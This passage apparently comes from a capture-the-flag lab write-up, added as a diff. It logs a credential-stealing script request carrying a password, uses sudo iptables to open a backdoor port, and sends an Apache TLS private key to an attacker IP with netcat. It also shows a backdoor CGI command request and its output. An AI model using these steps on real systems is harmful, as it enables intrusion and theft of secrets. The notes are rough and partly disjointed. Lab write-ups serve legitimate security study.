@@ -120,3 +120,57 @@ log from http server
 10.10.240.147 - - [11/Jan/2024 03:53:19] "GET /stealer4.js?jack:WhyIsMyPasswordSoStrongIDK HTTP/1.1" 200 -
 
 </code>
+
+<h1> PrivEscation </h1>
+╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                            
+Matching Defaults entries for jack on ubuntu:                                                               
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jack may run the following commands on ubuntu:
+    (ALL : ALL) /usr/sbin/iptables
+--remote-debugging-port
+jack@ubuntu:/opt$ ls
+capture.pcap  urgent.txt
+
+---
+<h2>after analysing captured packet found <\h2>
+  
+you need TLS key for decryption 
+jack@ubuntu:/opt$ nc -w 3 10.9.30.202 4444 < ../etc/apache2/certs/apache.key 
+
+
+GET /cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id HTTP/1.1
+Host: 10.0.2.15:41312
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+
+HTTP/1.1 200 OK
+Date: Wed, 16 Aug 2023 14:35:43 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Content-Length: 64
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html
+
+
+uid=33(www-data) gid=1003(h4ck3d) groups=1003(h4ck3d)
+<h2> open backdoor port <h2>
+  
+jack@ubuntu:/opt$ sudo /usr/sbin/iptables -I INPUT -p tcp --dport 41312 -j ACCEPT
+jack@ubuntu:/opt$ ss -tlnup | grep "41312"
+tcp   LISTEN 0      511               0.0.0.0:41312        0.0.0.0:*        
+
+
+
+
+
